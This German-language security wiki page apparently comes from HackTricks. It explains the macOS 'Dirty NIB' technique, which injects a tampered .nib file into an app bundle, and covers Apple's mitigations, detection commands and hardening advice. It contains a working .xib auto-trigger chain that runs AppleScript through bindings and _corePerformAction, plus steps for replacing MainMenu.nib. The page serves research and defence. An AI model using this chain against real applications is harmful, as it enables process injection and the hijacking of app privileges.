# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB bezeichnet den Missbrauch von Interface-Builder-Dateien (.xib/.nib) innerhalb eines signierten macOS-App-Bundles, um vom Angreifer kontrollierte Logik innerhalb des Zielprozesses auszuführen und dadurch dessen Entitlements und TCC-Berechtigungen zu übernehmen. Diese Technik wurde ursprünglich von xpn (MDSec) dokumentiert und später von Sector7 verallgemeinert und erheblich erweitert. Sector7 behandelte außerdem die Schutzmaßnahmen von Apple in macOS 13 Ventura und macOS 14 Sonoma.<sup>[1][2]</sup> Hintergrundinformationen und ausführliche Analysen finden sich in den Referenzen am Ende.

> TL;DR
> • Vor macOS 13 Ventura: Das Ersetzen des MainMenu.nib eines Bundles (oder eines anderen beim Start geladenen nib) konnte zuverlässig process injection und häufig eine privilege escalation erreichen.
> • Seit macOS 13 (Ventura) und mit Verbesserungen in macOS 14 (Sonoma): Eine gründliche Überprüfung beim ersten Start, Bundle-Schutz, Launch Constraints und die neue TCC-Berechtigung „App Management“ verhindern weitgehend das nachträgliche Manipulieren von nib durch nicht zugehörige Apps. Angriffe können in speziellen Fällen weiterhin möglich sein (z. B. bei same-developer tooling, das eigene Apps modifiziert, oder bei Terminals, denen der Benutzer App Management/Full Disk Access gewährt hat).


## Was sind NIB/XIB-Dateien

Nib-Dateien (kurz für NeXT Interface Builder) sind serialisierte UI-Objektgraphen, die von AppKit-Apps verwendet werden. Modernes Xcode speichert bearbeitbare XML-.xib-Dateien, die beim Build in .nib-Dateien kompiliert werden. Eine typische App lädt ihre Haupt-UI über `NSApplicationMain()`, das den Schlüssel `NSMainNibFile` aus der Info.plist der App liest und den Objektgraphen zur Laufzeit instanziiert.

Wichtige Punkte, die den Angriff ermöglichen:
- Das Laden von NIB instanziiert beliebige Objective-C-Klassen, ohne dass diese NSSecureCoding implementieren müssen (Apples Nib-Loader greift auf `init`/`initWithFrame:` zurück, wenn `initWithCoder:` nicht verfügbar ist).
- Cocoa Bindings können missbraucht werden, um beim Instanziieren von NIB Methoden aufzurufen, einschließlich verketteter Aufrufe, die keine Benutzerinteraktion erfordern.


## Dirty NIB injection process (Angreiferperspektive)

Der klassische Ablauf vor Ventura:
1) Eine bösartige .xib erstellen
- Ein `NSAppleScript`-Objekt (oder andere „Gadget“-Klassen wie `NSTask`) hinzufügen.
- Ein `NSTextField` hinzufügen, dessen Titel den Payload enthält (z. B. AppleScript oder Command-Argumente).
- Ein oder mehrere `NSMenuItem`-Objekte hinzufügen, die über Bindings so verbunden werden, dass sie Methoden auf dem Zielobjekt aufrufen.

2) Automatisches Auslösen ohne Benutzerklicks
- Bindings verwenden, um Target/Selector eines Menüelements festzulegen, und anschließend die private Methode `_corePerformAction` aufrufen, sodass die Aktion automatisch ausgeführt wird, wenn das NIB geladen wird. Dadurch muss der Benutzer nicht auf eine Schaltfläche klicken.

Minimales Beispiel einer Auto-Trigger-Kette innerhalb einer .xib (zur besseren Übersicht gekürzt):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Dies ermöglicht die Ausführung beliebiger AppleScript-Befehle im Zielprozess beim Laden des nib.<sup>[1]</sup> Fortgeschrittene Chains können:
- Beliebige AppKit-Klassen instanziieren (z. B. `NSTask`) und Methoden ohne Argumente wie `-launch` aufrufen.
- Beliebige Selektoren mit Objektargumenten über den oben beschriebenen Binding-Trick aufrufen.
- `AppleScriptObjC.framework` laden, um eine Brücke zu Objective-C herzustellen und sogar ausgewählte C-APIs aufzurufen.
- Auf älteren Systemen, die noch `Python.framework` enthalten, eine Brücke zu Python herstellen und anschließend `ctypes` verwenden, um beliebige C-Funktionen aufzurufen (Forschung von Sector7).<sup>[2]</sup>

3) Die nib der App ersetzen
- `target.app` an einen beschreibbaren Ort kopieren, z. B. `Contents/Resources/MainMenu.nib` durch die bösartige nib ersetzen und `target.app` ausführen. Vor Ventura führte Gatekeeper nach einer einmaligen Bewertung bei nachfolgenden Starts nur oberflächliche Signaturprüfungen durch, sodass nicht ausführbare Ressourcen (wie `.nib`) nicht erneut validiert wurden.

Beispiel für ein AppleScript-Payload für einen sichtbaren Test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Moderne macOS-Schutzmechanismen (Ventura/Monterey/Sonoma/Sequoia)

Apple hat mehrere systemweite Mitigations eingeführt, die die Einsatzfähigkeit von Dirty NIB in modernen macOS-Versionen drastisch reduzieren:<sup>[2]</sup>
- Tiefgehende Verifizierung beim ersten Start und Bundle-Schutz (macOS 13 Ventura)
- Beim ersten Start jeder App (unter Quarantäne oder nicht) deckt eine tiefgehende Signaturprüfung alle Bundle-Ressourcen ab. Danach wird das Bundle geschützt: Nur Apps desselben Entwicklers (oder Apps, die von der App ausdrücklich zugelassen wurden) dürfen dessen Inhalte ändern. Andere Apps benötigen die neue TCC-Berechtigung „App Management“, um in das Bundle einer anderen App zu schreiben.
- Launch Constraints (macOS 13 Ventura)
- System-/Apple-Bundled-Apps können nicht an einen anderen Ort kopiert und dort gestartet werden. Dadurch wird der Ansatz „nach /tmp kopieren, patchen, ausführen“ für OS-Apps verhindert.
- Verbesserungen in macOS 14 Sonoma
- Apple hat App Management weiter gehärtet und bekannte, von Sector7 dokumentierte Bypasses (z. B. CVE‑2023‑40450) behoben. Python.framework wurde bereits früher entfernt (macOS 12.3), wodurch einige Privilege-Escalation-Ketten nicht mehr funktionieren.
- Änderungen an Gatekeeper/Quarantine
- Eine ausführlichere Diskussion von Gatekeeper, Provenance und Assessment-Änderungen, die diese Technik beeinflusst haben, findest du auf der unten referenzierten Seite.

> Praktische Auswirkung
> • Unter Ventura+ kannst du das .nib einer Drittanbieter-App im Allgemeinen nicht ändern, sofern dein Prozess nicht über App Management verfügt oder dieselbe Team ID wie das Ziel verwendet (z. B. Developer-Tooling).
> • Die Vergabe von App Management oder Full Disk Access an Shells/Terminals öffnet diese Angriffsfläche effektiv wieder für alles, was Code im Kontext dieses Terminals ausführen kann.


### Umgang mit Launch Constraints

Launch Constraints verhindern seit Ventura, dass viele Apple-Apps von nicht standardmäßigen Speicherorten aus ausgeführt werden. Wenn du dich auf Workflows aus der Zeit vor Ventura verlassen hast, bei denen eine Apple-App in ein temporäres Verzeichnis kopiert, `MainMenu.nib` geändert und anschließend gestartet wurde, musst du davon ausgehen, dass dies unter >= 13.0 fehlschlägt.


## Auflisten von Zielen und nibs (nützlich für Forschung / Legacy-Systeme)

- Apps finden, deren UI von nibs gesteuert wird:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Finde potenzielle nib-Ressourcen innerhalb eines Bundles:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Codesignaturen gründlich validieren (schlägt fehl, wenn du Ressourcen manipuliert und nicht erneut signiert hast):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Hinweis: Auf modernem macOS wird man beim Versuch, ohne entsprechende Autorisierung in das Bundle einer anderen App zu schreiben, zusätzlich durch Bundle-Schutz/TCC blockiert.


## Erkennung und DFIR-Tipps

- Überwachung der Dateiintegrität von Bundle-Ressourcen
- Auf Änderungen von mtime/ctime an `Contents/Resources/*.nib` und anderen nicht ausführbaren Ressourcen in installierten Apps achten.
- Unified Logs und Prozessverhalten
- Auf unerwartete AppleScript-Ausführung innerhalb von GUI-Apps sowie auf Prozesse achten, die AppleScriptObjC oder Python.framework laden. Beispiel:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proaktive Bewertungen
- Regelmäßig `codesign --verify --deep` für kritische Apps ausführen, um sicherzustellen, dass die Ressourcen intakt bleiben.
- Privilegienkontext
- Prüfen, wer oder was über TCC-„App Management“ oder Full Disk Access verfügt (insbesondere Terminals und Management-Agents). Das Entfernen dieser Berechtigungen aus universell einsetzbaren Shells verhindert eine triviale erneute Aktivierung von Dirty-NIB-ähnlicher Manipulation.


## Defensive Härtung (Entwickler und Verteidiger)

- Programmatische Benutzeroberflächen bevorzugen oder einschränken, was aus nibs instanziiert wird. Keine leistungsfähigen Klassen (z. B. `NSTask`) in nib-Graphen einbinden und Bindings vermeiden, die indirekt Selektoren auf beliebigen Objekten aufrufen.
- Die Hardened Runtime mit Library Validation einsetzen (bei modernen Apps bereits Standard). Dies verhindert zwar keine nib injection an sich, blockiert jedoch das einfache Laden nativen Codes und zwingt Angreifer in scripting-only Payloads.
- Keine umfassenden App-Management-Berechtigungen in universell einsetzbaren Tools anfordern oder voraussetzen. Wenn MDM App Management erfordert, diesen Kontext von benutzergesteuerten Shells trennen.
- Die Integrität des App-Bundles regelmäßig überprüfen und sicherstellen, dass die Update-Mechanismen die Bundle-Ressourcen selbstständig reparieren.


## Verwandte Informationen in HackTricks

Mehr über Gatekeeper, Quarantäne und Änderungen an der Provenienz erfahren, die diese Technik beeinflussen:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Referenzen

- [1] [xpn – DirtyNIB (originaler Write-up mit Pages-Beispiel)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (5. April 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
